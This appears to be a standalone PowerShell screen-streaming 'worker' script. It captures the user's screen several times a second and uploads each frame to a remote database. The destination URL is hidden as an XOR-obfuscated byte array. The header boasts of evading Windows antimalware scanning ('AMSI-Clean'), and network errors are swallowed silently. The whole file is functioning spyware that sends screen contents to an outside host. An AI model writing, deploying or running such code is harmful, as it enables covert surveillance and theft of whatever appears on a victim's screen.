# ==============================================================================
# CMD_Remote Adaptive Live Screen Worker (AMSI-Clean & Zero-Install)
# ==============================================================================
param(
    [string]$SecretKey = "2816",
    [string]$FirebaseUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))",
    [int]$Fps = 6,
    [int]$MaxFrames = 300 # ~50 seconds continuous live stream per session
)

if ($FirebaseUrl -notlike "*/") { $FirebaseUrl += "/" }

Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue

$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$tmp = Join-Path $env:TEMP "live_frame_$SecretKey.jpg"
$url = "$($FirebaseUrl)live_stream/$SecretKey.json"
$delayMs = [int](1000 / $Fps)

Write-Output "Starting AMSI-Clean Live Screen Worker for Key $SecretKey ($Fps FPS)..."

for ($f = 0; $f -lt $MaxFrames; $f++) {
    $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
    $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose()
    $bmp.Dispose()

    $bytes = [System.IO.File]::ReadAllBytes($tmp)
    $b64 = [Convert]::ToBase64String($bytes)
    $payload = '{"frame":' + $f + ',"timestamp":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","image":"' + $b64 + '"}'

    try {
        $req = [System.Net.HttpWebRequest]::Create($url)
        $req.Method = "PUT"
        $req.Timeout = 1200
        $req.KeepAlive = $true
        $req.Proxy = $null
        $req.ContentType = "application/json; charset=utf-8"
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $req.ContentLength = $bodyBytes.Length
        $st = $req.GetRequestStream()
        $st.Write($bodyBytes, 0, $bodyBytes.Length)
        $st.Close()
        $resp = $req.GetResponse()
        $resp.Close()
    } catch {}

    Start-Sleep -Milliseconds $delayMs
}

Remove-Item $tmp -Force -ErrorAction SilentlyContinue
Write-Output "Live Stream Session Completed."
